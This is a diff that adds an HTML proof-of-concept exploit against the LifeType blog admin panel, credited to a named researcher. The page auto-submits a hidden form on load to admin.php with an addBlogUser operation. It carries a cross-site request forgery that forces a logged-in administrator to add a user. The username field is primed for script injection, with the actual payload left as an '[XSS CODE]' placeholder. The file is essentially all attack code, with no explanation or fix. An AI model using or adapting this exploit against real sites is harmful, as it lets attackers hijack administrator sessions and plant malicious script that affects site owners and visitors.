@@ -1,0 +1,16 @@
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+#Vulnerabily discovered by Khashayar Fereidani Or Dr.Crash
+&lt;body onLoad=javascript:document.form.submit()&gt;
+
+&lt;form action=&quot;http://www.example.com/lifetype/admin.php?op=editArticleCategories&quot;
+
+method=&quot;POST&quot; name=&quot;form&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;newBlogUserName&quot; value=&quot;&amp;#x22;&amp;#x20;[XSS CODE]&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;Add this user&quot; value=&quot;Add&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;op&quot; value=&quot;addBlogUser&quot;&gt;
+
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
